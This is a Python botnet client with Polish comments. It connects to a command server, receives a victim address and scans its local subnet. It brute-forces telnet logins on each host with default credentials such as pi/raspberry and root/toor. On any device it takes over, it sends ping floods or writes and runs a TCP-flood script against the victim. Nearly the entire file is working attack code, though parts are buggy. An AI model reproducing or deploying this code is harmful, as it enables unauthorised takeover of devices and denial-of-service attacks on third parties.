import socket
import time
import telnetlib
# przekazac kopię
# from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD
from _thread import start_new_thread

attack = False


# todo: zrobić przerwanie ataku idk jak ( można odczytywać zmienną globalną, a w mainie wątek ktory odczytuje tą
#  zmienną? w sumie wystarczy w funkcjach )
#

def telnetConnect(ip_address, victimIP, attackType: int):
    # można zrobić pętlę do wczytywania user credentials z pliku
    users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
    passwords = ['1234', 'toor', 'admin', 'root', 'user', 'raspberry']

    for user in users:
        # print('connecting with login: ' + user)
        for password in passwords:
            time.sleep(10)
            if not attack:
                print("telnet return")

            try:
                tn = telnetlib.Telnet(ip_address, port=23)

            except:
                # if ip_addres does not respond return
                # print("host not responding")
                return

            # print(' and passwd: ' + password)
            try:
                tn.read_until(b"login: ")
                tn.write(user.encode('ascii') + b"\n")
                if password:
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
            except EOFError:
                print("error")
                tn.close()
                continue

            if attackType == 1:  # note
                print('pingujemy..')
                tn.write(b"ping 192.168.100.7\n")  # można zrobić wątki
                if not attack:
                    print("stopping attack")
                    return
                time.sleep(60)

                # print(tn.read_all().decode('ascii'))

            if attackType == 2:
                file = open('tcp_flood_code.txt', 'r')
                str1 = file.read()
                str1.replace('1.1.1.1', victimIP)
                str1.replace('111111', '10001')

                print(tn.write(b"touch code.py"))
                print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'code.py', encoding="ascii")))
                print(tn.write(b"python code.py"))
                file.close()
                if not attack:
                    print(tn.write(b"exit"))  # todo:jak wyjść z wykonującego sie skryptu?!?!
                    return

                    # tn.write(b"exit\n")
            tn.close()

    # t.close()


def checkForOtherDevices(ip, victimIP):
    x = 2
    l = len(ip)
    g = ip.split('.')[-1]
    ip = ip[:l - len(g)]
    print('connecting to telnet...')

    while x < 254:
        if not attack:
            return
        current_address = ip + str(x)
        # próbuj połączyć z każdym przez telnet
        # print(current_address)
        start_new_thread(telnetConnect, (current_address, victimIP, 1))
        x += 1

    print('finished')




if __name__ == '__main__':

    HOST = '127.0.0.1'  # The server's hostname or IP address
    PORT = 65432  # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        flag = 0
        while True:

            if flag == 1:
                continue

            while flag != 1:
                time.sleep(0.5)
                try:
                    print('trying to connect...')
                    s.connect((HOST, PORT))
                    # send info to host that a bot is connected
                    s.send('1'.encode())
                    # checkForOtherDevices(HOST)
                    flag = 1
                except:
                    print('nie udało sie połączyć')
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    flag = 0
                    continue
                time.sleep(1)
                print("Connection established!")

            data = str(s.recv(1).decode())
            print('Received', str(data))
            if str(data) == '1':

                victim_ip = str(s.recv(1024).decode())
                print('victim address:' + str(victim_ip))
                checkForOtherDevices(HOST, victim_ip)
                attack = True
            elif data == 2:  # dostan nowe ip serwera

                HOST = s.recv(1024)
                s.close()
                flag = 0
                continue
            else:
                print('something went wrong')

            # zrobić try zeby sie nie wywalilo
            stop = str(s.recv(1).decode())
            if stop == '0':
                attack = False
                print("Stoping")
            time.sleep(5)
            # ip = get('https://api.ipify.org').text
            # print('public IP address: {}'.format(ip))
            # print('operating port: {}'.format(PORT))

            # print('Received', str(data))
